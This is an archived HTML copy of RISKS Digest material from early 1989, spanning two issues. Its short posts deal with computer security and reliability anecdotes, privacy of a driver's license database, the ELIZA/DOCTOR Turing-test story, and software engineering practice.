  Virus conference hosts software swap meet 
</A>
<DD>
<A HREF="#subj8.1">
Robert Lee Wilson Jr
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Structured Programs, Project Failures 
</A>
<DD>
<A HREF="#subj9.1">
Charles J. Wertz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Losing Systems 
</A>
<DD>
<A HREF="#subj10.1">
Mike Albaugh
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Hong Kong computer horse betting
</A>
</H3>
<address>
George Moore
&lt;<A HREF="mailto:georgem@microso.UUCP  ">
georgem@microso.UUCP  
</A>&gt;
</address>
<i>
Sun, 29 Jan 89 06:16:26 -0500
</i><PRE>

Tonight's "Beyond Tomorrow" program on Fox television did a short article about
a device that is currently under test in Hong Kong.  It is a portable (slightly
larger than a calculator) terminal which allows a user to place bets on horse
races from anywhere that has a modular phone connection.  It has 6
touch-sensitive LCD windows which present various menus allowing the person to
place up to 100 bets per race.  Once all of the bets are entered, you just
connect it to the phone line and it dials up the computer at the race track.
Your account number is stored in the (presumably) EEPROM of the device; all you
have to enter is a 6 digit PIN number to identify yourself.  Money won or lost
is automatically reflected in your bank account.

The RISKS implications are enormous.  People are currently grumbling on how
unsecure an ATM is.  That's nothing compared to this! At least with an ATM you
have leased lines that are slightly harder to tap, with this wonderful device
all someone has to do would be to tap a phone extension in your house or office
and grab your PIN number.  Even if it's encrypted, the thief will have plenty
of time to break the code offline.  After that he's free to deplete your bank
account.  With the proper fake ID, he could freely collect his winnings at the
race track.  Why gamble with your own money?  Use someone else's!

The American Horse Racing Association is looking heavily into using this device
in the U.S. to relieve overburdened telephone operators at most race tracks.

I for one, even if I *did* frequent the tracks, would never trust such a
device over ordinary phone lines.
                                          -George Moore

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Keycard badges vs. anti-shoplift systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:"Bruce_Hamilton.OsbuSouth"@Xerox.COM">
"Bruce_Hamilton.OsbuSouth"@Xerox.COM
</A>&gt;
</address>
<i>
28 Jan 89 17:00:10 PST (Saturday)
</i><PRE>

Here's a new one.  In Xerox/El Segundo we use these big heavy blue keycard
badges that you slap against (or hold near) a reader to open various doors.
Today I went shopping in the local Target store and as I tried to exit, all
sorts of lights and bells went off.  You guessed it -- the badge was
responsible.  The guard apologized and gave me a little piece of cardboard
labeled "SCHLAGE SHIELD" to put next to my badge.  Of course, when I got to
work, I had to remove the cardboard to get the badge to work.
                                                                 --Bruce

   [Interesting.  The same mechanism is used for entry control at Xerox
   and exit control (anti-theft) at Target.  The moral unfortunately is that
   the SCHLAGE SHIELD works fine to circumvent the anti-theft control.  
   Here is another supposedly high-tech solution with a trivial bypass.
   Ho-hum.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
     Bank Fraud
</A>
</H3>
<address>
Peter Golde 
&lt;<A HREF="mailto:ST501432@BROWNVM.BITNET">
ST501432@BROWNVM.BITNET
</A>&gt;
</address>
<i>
Sat, 28 Jan 89 22:47:49 EST
</i><PRE>

A few days ago I saw a program on TV dealing with bank fraud and
mismanagement.  One of the reports went somewhat as follows:

    An employee in the computer division, who had been working at the bank less
    than a year, one day sent a computer message to the Brinks depository which
    stores and handles gold bullion for the bank.  The message simply asked for
    Brinks to send 44 kilos of gold to such and such P.O. Box in a town in
    California.  As per normal procedure, Brinks sent the money to the address,
    where the employee (or a confederate) picked it up.  The employee then
    disappeared and still remains at large.  Subsequent investigation revealed
    that the bank had never even checked his (phony) previous employment
    references when he was hired.

Boggles the mind, eh?  One simple email message!               --Peter Golde

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Crashing a PDP-11/40 (Computer Folklore)
</A>
</H3>
<address>
Jeff Makey 
&lt;<A HREF="mailto:Makey@LOGICON.ARPA">
Makey@LOGICON.ARPA
</A>&gt;
</address>
<i>
30 Jan 1989 0132-PST (Monday)
</i><PRE>

In 1979 or so I heard a story that was already a couple of years old
about a DEC PDP-11/40.  It seems that one could walk across the room,
kick the console terminal, and crash the computer.

After a certain amount of wailing and gnashing of teeth, they determined
that walking across the room generated a static charge, which was
transferred to the console terminal by kicking it.  The (now dynamic) charge
traveled down the communication wire to the terminal interface board and
jumped across a narrow air gap to a neighboring circuit board, thereby
disrupting things enough to crash the system.  The problem was solved by
moving one of the circuit boards to a different slot, which created too
large an air gap for the charge to jump.
                                                      :: Jeff Makey 

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Sprint to the Finish?
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 30 Jan 89 14:33:38 PST
</i><PRE>

   In 8.16 a call went out for documentable stories on computer problems.
I'm having one right now with US Sprint.  Here's the story.

   About a year and a half ago I moved from LA to the SF Bay area.  I followed
the instructions of my long distance carrier, US Sprint, which allowed me to
keep my account while I moved, and to have it transferred to my new address
when I established a new residence.  A problem developed however, as Sprint set
up a second account for me at my new address.  I started to receive two bills
each month, one for my calls placed from home, and another for those placed
with the Sprint credit card.  The two bills were for different account numbers.

   I called Sprint about this, and they said they would consolidate the
accounts, but I should send checks to pay the ammount due on each. I did so.
Here lies the rub.  Each time Sprint receives a check from me, they credit only
account A.  It makes no difference that I place the appropriate account numbers
on both checks, and that they are sent in separately with billing forms for the
appropriate accounts -- checks for account B get credited to account A.  Sprint
now has submitted my account B to a debt collection agency.  I have repeatedly
called customer service and explained the problem, but they have taken no
action, even though their records show two checks being credited to account A
for each billing period.  They have trouble believing that they could be
screwing up their accounts receivables so badly.

   I am now at the point of having my credit history being damaged by
US Sprint, and may soon be contacting an attorney to sue them for same.
Ah, the joys of dealing with a system where the "computer" makes no mistakes.

   Note:  If any readers out there work for Sprint, I'd appreciate your
help in getting this problem fixed.  Anyone know the name/address of the CEO?

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Information Security/Computer Crime Statistics
</A>
</H3>
<address>
&lt;<A HREF="mailto:Stahl@DOCKMASTER.ARPA">
Stahl@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 22:57 EST
</i><PRE>

The National Center for Computer Crime Data is a non-profit organization
devoted to the collection and dissemination of statistical information
on computer crime, information security technology, and the information
security profession.  The Center is currently gathering statistics for
its second report, "Commitment to Security." The Report is scheduled for
release in May.

People with diverse backgrounds will read "Commitment to Security."
These include information security professionals, including computer
security practitioners, those in the R&amp;D community, and sales and
marketing personnel.  Prosecutors and others responsible for enforcing
computer crime laws will also read the Report.  In addition, based on
our experience with the first Report, the media will use "Commitment to
Security" as a sourcebook on the extent and seriousness of computer
crime.  Consequently, it is important that the Report be as thorough,
valid and meaningful as possible.  Towards that end, we have surveyed
3500 computer security professionals and 2500 prosecutors.

There are, however, methodological questions about how best to measure
and communicate the problems of computer crime and information security
technology.  Therefore, the Center would like to invite RISKS
participants to engage in a conversation on these issues.

We would like to have a discussion in RISKS of questions like the following:

      What statistics would enhance our understanding of the
      scope and seriousness of the computer crime problem?

      What statistics would enhance our understanding of
      information security technology and its potential
      for reducing computer crime?

      How can we best get valid statistics on computer crime and
      computer security technology?

      How can we best present our information so that it is
      understood, both by the professional and the layman?

We will send a free copy of the report to anyone who meaningfully contributes
to the discussion.

If you want to talk to us off-line, please call

  JJ Buck BloomBecker,             Director, NCCCD,             213/874-8233
    or
  Stan Stahl            Research Director, NCCCD,               213/969-0777

Thanks, in advance, for your participation.

                                  [By the way, Dockmaster has been off the 
                                  net since just after this was posted.  PGN] 

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Re: ELIZA and Joe Weizenbaum
</A>
</H3>
<address>
Bernie Cosell 
&lt;<A HREF="mailto:cosell@WILMA.BBN.COM">
cosell@WILMA.BBN.COM
</A>&gt;
</address>
<i>
Sat, 28 Jan 89 0:22:59 EST
</i><PRE>

} &gt; Or, there's the story about the guy who falls asleep in front of his
} &gt; terminal with an ELIZA program running and his boss logs on and thinks he's
} &gt; talking to him but is actually talking to the program, and gets pissed off.
}\
} This may have actually happened. Joseph Weizenbaum (MIT professor, author of
} _Computer Power and Human Reason_) told the anecdote in a class, with himself
} as one of the actors.  It went something like this -- some of this is
} doubtless my own memory inventing things.  The dialogue is partially courtesy
} of GNU Emacs' Eliza program, and the rest is made up.
}\
} .... anecdote follows...

Is that for real, that Joe is telling that story?  He has a lot of
anecdotes, many of which appear in CP&amp;HR, but I didn't know he was
including one like that these days (alhtough such a thing must have
SURELY happened some time or other at MIT).  The REAL first round of
that anecdote dates publicly to a small bit Danny Bobrow wrote in the
first issue of some AI journal he started in something like 1968.  The
thing DID happen, although not quite as the word-of-mouth has
transmitted it down to the present generation.  The program in question
was _DOCTOR_, **NOT** Eliza, and it happened at BBN, not at MIT.

I know all of this, because (Ta DAAH!) **I** wrote the original
Doctor!  Not _Eliza_ --- _doctor_: Weizenbaum's CACM article on Eliza
had just appeared and for a variety of reasons I was looking for a neat
Lisp hack to play with.  The CACM article mostly told me enough, and I
went off and wrote the thing.  I can supply the details of the *real*
"A Turing Test Passed" incident (the title of Danny Bobrow's article
describing the event: it involved my version of doctor that I had left
running for people to play with to help me get it debugged, the
"innocent third party" -- Danny Bobrow, and the Turing Testee, a random
executive (whose name I will not reveal) who thought (for reasons that
it is hard to figure out) that the Mod-33 was connected through to
Danny at home early on a Saturday morning.

I can supply more details if anyone really cares, including (if I can
dig the thing out of my archives) a copy of Bobrow's article about
the incident which included the *real* typescript (danny came in later
that Saturday morning and ripped it off of the terminal).

Bernie Cosell, BBN Sys &amp; Tech, Cambridge, MA 02238

</PRE>
<HR><H3><A NAME="subj7.2">
ELIZA and Joe Weizenbaum
</A>
</H3>
<address>
&lt;<A HREF="mailto:KROVETZ@cs.umass.EDU">
KROVETZ@cs.umass.EDU
</A>&gt;
</address>
<i>
Mon, 30 Jan 89 02:26 EST
</i><PRE>

Bloom's story about Weizenbaum and ELIZA is close, but the person involved was
Daniel Bobrow, not Weizenbaum.  The account was described in the December 1968
issue of the SIGART Newsletter, and was reprinted in the book Machines Who
Think, by Pamela McCorduck (p. 225).

The following is the description of the account:

"One Saturday morning about 9 A.M., a BBN Vice-President in charge of selling
our Telcomp commercial service arrived at our PDP-1 computer room hoping to be
able to use the computer for a demonstration.  He found a note on the PDP-1
teletype that read: `TYPE ALL MESSAGES INTO THIS TELETYPE, AND END THEM WITH A
PERIOD'.  This note was left there by one of the programming bums who had just
succeeded in making run a Lisp version of the DOCTOR program (based on ELIZA as
developed by Weizenbaum).  However, the VP thought that this note indicated
that this teletype was linked with the one in my [Bobrow's] home, since I often
used the computer all night.  Therefore, he started typing to `me', but in fact
was typing to this version of the DOCTOR program.  The following conversation
ensued:

  VP:        Do you think that I can use the computer this morning?

  TELETYPE:  Why do you ask?

  VP:        I might be able to make some additional telcomp sales.

  TELETYPE:  Why aren't you sure?

  VP:        My prospective customers have never seen a demonstration
             of the system.

  TELETYPE:  Does this mean very much to you?

  VP:        Of course it does.

  TELETYPE:  You seem very positive of that.

  VP:        This is ridiculous.

  TELETYPE:  What do you mean this is ridiculous?

  VP:        Is there any reason why I can't use the computer now?

  TELETYPE:  Tell me more about your prospective customers.

  VP:        Please dial me up on 491-1850

Note that after that remark the VP did not obey instructions and left out
the period.  Therefore, of course, the computer didn't answer him.  This
so infuriated the VP, who thought I was playing games with him, that he 
called me up, woke me from a deep sleep, and said:

  VP:        Why are you being so snotty with me?

  BOBROW:    What do you mean why am I being snotty to you?

The VP angrily read the dialog that `we' had been having, and couldn't
get any response but laughter from me.  It took me a while to convince
him it really was the computer".

Bob Krovetz      krovetz@cs.umass.edu or krovetz@umass.bitnet

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Virus conference hosts software swap meet
</A>
</H3>
<address>
Robert Lee Wilson Jr
&lt;<A HREF="mailto:bobw@ford-wdl44 ">
bobw@ford-wdl44 
</A>&gt;
</address>
<i>
Mon, 30 Jan 89 11:50:48 PST
</i><PRE>

   I just received an ad from MIS Training Institure for "Micto/89 -- A
Three-Day Conference on Microcomputer technology and its Impact on Security,
Control, and Audit."

   Among its concerns: "Indeed, with the recent front page coverage of the
computer virus that struck universities, research, and government organizations
across the country, one needn't be a security specialist to be aware of the
problem."

   So what is the first big benefit offered by the conference?


"                           SPECIAL FEATURE
                            Software Bonanza
o Software Swap        
Bring diskettes with your original spreadsheet templates, BASIC, dBase, or
other applications and swap them for the brainchild of a coregistrant. MIS will
operate a Swap Center throughout the conference where we will maintain a
library and make copies of diskettes for participants.
 
o Software Giveaway
When you attend the conference you will receive diskettes containing: Lotus 123
macros, utilities, virus detectors, graphics programs, and templates fot data
analysis, statistics, investment analysis, and Lotus macros.

o Software Directory
Along with conference materials, you will receive an invaluable Directory
listing over 1000 public domain and shareware programs you can obtain for
little or no cost.

o MIS Electronic Resource Center
MIS' electronic bulletin board containing software programs, bibliographies,
articles, audit programs, and much more will be available for your use during
the Conference.  "


The ad says the conference will "update you on new technologies and the risks
to which they expose your organization." It sounds as if it might turn out to
be a lab course.
                                        Bob Wilson 

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Structured Programs, Project Failures
</A>
</H3>
<address>
&lt;<A HREF="mailto:<WERTZCJ@SNYBUFVA.BITNET> Charles J. Wertz        Buffalo State College">
&lt;WERTZCJ@SNYBUFVA.BITNET&gt; Charles J. Wertz        Buffalo State College
</A>&gt;
</address>
<i>
Sat, 28 Jan 89 15:13 EDT
</i><PRE>

Over the last several months, there have been a number of articles touching on
the above in Risks.                        Most of my computer career has
involved the development of business systems for commercial enterprises.
I never cease to be amazed by several things. And, I consider them to be
contributing factors to the type of problem noted often noted here. They are -

       . the poor decisions which managers (both business and technical)
         often make for non technical reasons.
       . the haphazard approach many of our colleagues take toward requirements
         determination, requirement verification, and system testing.
       . the near crimes committed in the name of 'meeting the deadline".
       . the belief that following the externals of a methodology (such as
         indenting and naming rules or the format of a deliverable) is the
         same as understanding and following the methodology.
       . the failure of many of our colleagues to understand or try to
         understand the reasoning processes behind the popular methodologies.

I'll resist the temptation to go on. I do believe that the above are primary
explanations for many of the really poor business systems in existence today.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Losing Systems (<A HREF="/Risks/8.12.html">RISKS-8.12</A>)
</A>
</H3>
<address>
Mike Albaugh
&lt;<A HREF="mailto:albaugh@dms.UUCP ">
albaugh@dms.UUCP 
</A>&gt;
</address>
<i>
Mon Jan 23 13:01:30 1989
</i><PRE>
Organization: Atari Games Inc., Milpitas, CA

&gt; I would like to suggest that it would suffice anyway if it were applied.  The
&gt; difficulty is that software is managed by programmers, not engineers.

	Actually, both are, in my experience, managed by managers, who may
not be either, but who owe their primary allegience to other managers.

&gt; Programmers have no tradition of quality of their own and insist that their
&gt; activity is so different from what engineers do, that engineers have nothing 
&gt; to teach them.

	I don't know what the first statement is suppose to mean, but it
looks suspiciously like yet another of the gratuitous slaps that programmers
typically get from engineers. For the record, I am officially a programmer,
but have done a fair amount of hardware design (and been paid well by a
satisfied employer for both). The major problem I have found is perhaps the
name "software". Managers hear that and assume that changes to software are
trivial (and free), while changes in hardware are impossible (or at least
very costly.) The result, intended or not, is that programmers are required
to add all sorts of software bandaids when the hardware fails to meet its
spec. It is seldom actually acknowledged that this is happening, but the
lack of acknowledgement does not mean a lack of happening. Especially in
a project that involves custom LSI, there will be quite a few "enhancements"
snuck into the software spec at the last minute (__way__ past "final"
design review) that are nothing more or less than shoving hardware bug-fixes
over the wall into the programmer's cubical.

&gt; I am hopeful that the use of the term "case" presages the application of more
&gt; discipline in programming.

	I could hope that some sort of documented "requirements control"
would make these games more visible, but I doubt it will. They will, as
usual, be swept under the rug as "clarification".

&gt; I also draw hope from the entreprenurial development of software for the
&gt; market, as opposed to works built for hire for a single organization.  I saw 
&gt; a great deal of quality software at Egghead on Saturday.

	The great advantage an entrepeneurial firm has is that the president,
Chief Engineer, and Chief Programmer have lunch together once in a while
and can often get away with calling a spade a spade.

&gt; William Hugh Murray, Fellow, Information System Security, Ernst &amp; Whinney
&gt; 2000 National City Center Cleveland, Ohio 44114                          
&gt; 21 Locust Avenue, Suite 2D, New Canaan, Connecticut 06840                

Mike Albaugh (albaugh@dms.UUCP || {...decwrl!turtlevax!}weitek!dms!albaugh)
Atari Games Corp (Arcade Games, no relation to the makers of the ST)
675 Sycamore Dr. Milpitas, CA 95035		voice: (408)434-1709
The opinions expressed are my own (Boy, are they ever)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.17.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.19.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-69</DOCNO>
<DOCOLDNO>IA012-000131-B037-358</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.19.html 128.240.150.127 19970217025344 text/html 22839
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:52:12 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 19</TITLE>
<LINK REL="Prev" HREF="/Risks/8.18.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.20.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.18.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.20.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 19</H1>
<H2> Wednesday 1 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Massachusetts limits disclosure of driver's license database. 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Dead Code Maintenance 
</A>
<DD>
<A HREF="#subj2.1">
Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj3.1">
Eric Roskos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Random Thoughts on Redundancy 
</A>
<DD>
<A HREF="#subj4.1">
Earl Boebert
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  One last word about probabilities 
</A>
<DD>
<A HREF="#subj5.1">
Dr Robert Frederking
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Independence and probabilities 
</A>
<DD>
<A HREF="#subj6.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Counting Engines 
</A>
<DD>
<A HREF="#subj7.1">
Mike Bell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Talk by Roy Saltman on computerized vote tallying 
</A>
<DD>
<A HREF="#subj8.1">
Charles Youman
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Massachusetts limits disclosure of driver's license database.
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
Tue, 31 Jan 89 08:53:23 PST
</i><PRE>

This was sent to me by a friend who works at DEC.  What I find notable
about this story is the linkage between selling personal information in
government databases to anyone who asks and legitimate law enforcement
activities.   It seems in this case it is felt you cannot limit the first
without hampering the other.   I can't tell from this account whether that
is a technical consequence of the way the database works, follows from the 
legalities somehow, or is just a misconception.

- Jon Jacky, University of Washington

------- Forwarded Message

    From THE BOSTON GLOBE, January 22, 1989, p.30

                  Registry Can Share Data With Police

    The Massachusetts Registry of Motor Vehicles may continue to give
    computerize information to law enforcement agencies, at least
    until there is a final ruling on a privacy suit challenging that
    practice, the Massachusetts Appeals court has ruled.

    The Appeals Court action modified an injunction issue last week by
    Superior Court Judge Joseph Mitchell. At issue is a challenge to a
    decades old Registry practice of which most holders of driver's
    licenses were not aware. For a small fee, the Registry has sold
    information about Massachusetts motorists, including Social
    Security numbers, to private businesses and anyone else who
    asked. The Registry - which has perhaps the largest computerized
    data base in the state - also routinely shares data with hundreds
    of law enforcement agencies and with registries in other states.

    Citizens concerned about privacy filed suit against the Registry
    almost four years ago in Middlesex Superior court to block
    dissemination of their social security numbers and other personal
    data. Judge William Welch threw the case out on the grounds that
    the data collected and stored by the agency are "a public record."
    But in September, the Appeals court disagreed and gave the
    registry 60 days to show in Superior court why the information
    should not be kept confidential.

    Last week, in Middlesex Superior Court Judge Mitchell issued a
    permanent injunction declaring the registry's information about a
    motorist's age, height or Social Security number "personal data"
    that may not be disclosed.  The registry was banned from
    "distributing, offering, selling or making available" the data to
    anyone outside the registry. That ruling alarmed state officials
    who said it would cripple law enforcement efforts if the registry
    could not share information with police agencies. 

    The attorney general's office, representing the registry, warned
    that the agency would have no choice but to disconnect completely
    from the Criminal Justice Information System, which is connected
    to 500 Massachusetts and local police agencies. The system handles
    125,000 requests a day for information - 25,000 involving Registry
    data.

    "If the permanent injunction is not stayed, there would no
    effective enforcement of the motor vehicle laws within this state
    of any other state," testified Peter Larkowich, general counsel to
    the state agency that runs the information system. Without the
    data, he said, police could not identify motorists who cause or
    witness accidents and could not issue tickets "with any degree of
    certainty." 

    Robert Hernandez, the attorney representing the citizens in the
    privacy suit, said his clients did not want to appear to be "cop
    killers", so they negotiated a partial stay of Mitchell's ruling.
    "Basically, the feeling was that no judge was going to allow
    something to go on that would endanger the lives of law enforcement
    officers," Hernandez said. He said the registry would now have to
    warn motorists seeking a new license or renewing an old one that
    some of the information will be available to police. The registry
    will also have to inform motorists that they can request a
    randomly chosen number for their license number rather than their
    Social Security number.

    The Appeals Court also said it would hear appeals from the citizens
    and the Registry on an expedited schedule.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Dead Code Maintenance
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Tue, 31 Jan 89 13:04:56 CST
</i><PRE>

One of the benefits I get from living in Iowa City is that many of my students
have worked for one or the other of the local divisions of Rockwell
International.  One of them, who had worked for the Government Avionics
Division, on the Global Positioning System project related the following tale
to me:

Global Positioning System receivers are boxes that use information broadcast
by a system of satelites to deduce the latitude, longitude, and altitude of
the receiver.  These boxes are built into a variety of weapons systems now
in use by the United States and its allies.  The box contains a radio receiver
to listen to the satelites, and a fairly powerful computer to interpret the
radio signals.

The computers in the current production GPS receivers are programmed in Jovial,
although a new generation programmed in Ada will no doubt appear someday.  My
student was part of one of the teams that maintained the GPS code.  After
some time on the job, he began to realize that the code his team maintained
was never executed and had never been executed in the memory of any team
member.  That is, an entire team of programmers was being paid to maintain
dead code.  Despite the fact that the code was dead, the team was required to
produce the entire range of documents supporting each release of the code, and
they were required to react to various engineering change requests.

Not too surprisingly, my student became demoralized and left the company, but
not before learning enough to make the following hypothesis about how his
situation had come to be.

He guesses that, once upon a time, there was a prototype GPS system where his
module actually served some purpose and came to be executed from time to time.
The structure of this system was presumably used to define Rockwell's
contractual relationship to the Department of Defense, and as a result, his
module gained a legal standing that was quite independent of its function in
the GPS system.

As time passed, the actual calls to procedures in his module were eliminated
from the GPS system, for one reason or another, until the code was dead.  At
first, nobody knew it was dead.  The project was big enough that it wasn't
uncommon for the people working on one module to have at best infrequent
communication with those who called the procedures in the module, and
engineering change notices that required changes to the module kept everybody
busy.

Engineering change notices would not have arrived if the actual structure of
the program were used to determine who needed to participate in a change.  In
fact, the notices were distributed based on many other criteria, including the
contractual descriptions of the modules.  The team was quite busy keeping their
code up with the changes, testing changes using locally developed scaffolding,
and waiting for any report of failures from the global system tests.

The discovery that the code was dead appears to have resulted from its passing
global system tests even when it was obviously in error.  Once my student found
that the code was dead, he asked his managers why his efforts were being
waisted on it.  Their answer was that it was less expensive to maintain dead
code than it was to rewrite the contract with the Department of Defense to
eliminate the job.

Douglas W. Jones, Department of Computer Science, University of Iowa

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Structured Programming
</A>
</H3>
<address>
Eric Roskos
&lt;<A HREF="mailto:roskos@ida.org ">
roskos@ida.org 
</A>&gt;
</address>
<i>
Wed, 1 Feb 89 09:45:05 EST
</i><PRE>

&gt; What REALLY happens when a group of structured programmers tries to
&gt; develop a large program? Usually they argue about how the program should
&gt; be indented, what the comments should be like, how the subroutines
&gt; should be nested, ...  etc. 

If one believes that this is what "structured programming" is about, it
is no wonder that there are such problems with it. 

I wish I could give you some "war stories" about unstructured vs. 
programming, but unfortunately, all the software I've worked on has been
proprietary, and I've only encountered a few insightful people who could
tell from the outside which of the very large-selling software packages
was internally well-structured, and which wasn't.  Suffice to say that
often there is a strong correlation between how easily a program can be
adapted to meet new requirements and host system enhancements, and how
well-structured the program is.  Often it shows in the product
architecture (how the features visible to the user interrelate) too. 

There are at least two problems.  First, "structured programming" seems
to be one of those things you can learn only through experience; you
discover it slowly through years of practice, during which time some the
things that are taught as "structured programming" start to make some
sense, but only as a superficial veneer over what's really involved. 
Second, the sentiment expressed in the original article that "structured
programming" is a bad thing in the development environment is
widespread, and the disasters which result (which are very real to those
who have had to maintain large programs) are often covered over by the
developers, so that they are unknown on the outside.  Sometimes a
carefully-worded manual or an assortment of appealing new features can
hide irreparable flaws in a program.  Problems can result because, for
instance, a programmer hardcoded a machine-specific feature throughout a
several hundred thousand line program instead of isolating it in one
place.  Or because the code was made dependent throughout on the size of
some data structure which was always referenced with a hard-coded constant
offset rather than using some more "structured" reference.  There are a
lot of examples of this sort of problem, which has nothing to do with
whether the program is "provably correct" or with how widely it sells.
But it does have a significant bearing on how long the program will last
without having to be rewritten.

Lately there seem to be new paradigms emerging (such as "object-oriented
programming") which are intended to make some of these principles more obvious.
They seem to have pros and cons, particularly in terms of efficiency, but
perhaps the fact that there is so much programming to be done, and so few
really experienced programmers out there, makes it necessary that some
easier-to-understand concept take the place of "structured programming" for the
most part.  Just as there are not very many really well-designed products of
any sort, there are not very many well-structured programs, and thus people
tend to blame "structured programming" for what is, in reality, simply bad
programming in a superficially neat and tidy style.

Eric Roskos, IDA (roskos@CS.IDA.ORG or Roskos@DOCKMASTER.ARPA)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
